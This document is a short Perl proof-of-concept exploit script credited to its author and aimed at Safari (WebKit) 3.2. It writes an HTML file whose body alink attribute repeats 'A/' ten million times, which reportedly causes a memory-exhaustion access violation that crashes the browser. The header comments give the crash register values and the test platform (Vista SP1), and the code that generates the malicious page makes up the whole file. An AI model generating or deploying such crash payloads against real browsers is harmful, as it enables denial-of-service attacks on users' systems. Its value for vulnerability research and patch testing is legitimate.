#!/usr/bin/perl
# safari_webkit_ml.pl
# Safari (Webkit) 3.2 Remote Memory Leak Exploit
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# Access violation when writing to [00000018]
# EIP 6B00A02B WebKit.6B00A02B
# LastError 00000008 ERROR_NOT_ENOUGH_MEMORY
# Memory leaks are common in browsers.. tested on Vista SP1
# Compliments of bf2

$filename = $ARGV[0];
if(!defined($filename))
{

     print "Usage: $0 <filename.html>\n";

}

$head = "<html>" . "\n";
$trig = "<body alink=\"" . "A/" x 10000000 . "\">" . "\n";
$foot = "</html>";

$data = $head . $trig . $foot;

     open(FILE, '>' . $filename);
     print FILE $data;
     close(FILE);

exit;